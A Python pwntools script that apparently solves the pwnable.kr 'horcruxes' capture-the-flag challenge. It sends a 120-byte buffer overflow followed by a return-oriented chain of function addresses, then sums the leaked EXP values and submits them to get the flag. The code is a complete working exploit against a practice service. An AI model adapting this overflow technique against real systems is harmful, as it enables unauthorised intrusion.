from pwn import *                                                                                                                                                     
                                                                                                                                                                      
a = ssh(host="pwnable.kr", user="horcruxes", password="guest", port = 2222)                                                                                           
p=remote("pwnable.kr", 9032)                                                                                                                                          
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
A = p32(0x0809fe4b)                                                                                                                                                   
B = p32(0x0809fe6a)                                                                                                                                                   
C= p32(0x0809fe89)                                                                                                                                                    
D= p32(0x0809fea8)                                                                                                                                                    
E= p32(0x0809fec7)                                                                                                                                                    
F= p32(0x0809fee6)                                                                                                                                                    
G= p32(0x0809ff05)                                                                                                                                                    
ropme = p32(0x0809fffc)


p.recvuntil("Select Menu:")
p.send("1\n")

p.recvuntil("earned? :")

payload = ''
payload += "M"*120
payload += A+B+C+D+E+F+G+ropme
p.sendline(payload)

p.recvline()

exp = 0

for i in range(7):
        exp_text = p.recvline()
        if "+-" in exp_text:
                exp += int(exp_text.split("EXP")[-1].strip()[1:-1])
        else:
                exp += int(exp_text.split("EXP")[-1].strip()[0:-1])


p.recvuntil("Select Menu:")
p.send("1\n")

p.recvuntil("earned? :")

p.sendline(str(exp))

flag = p.recvline()

print("flag ",flag)
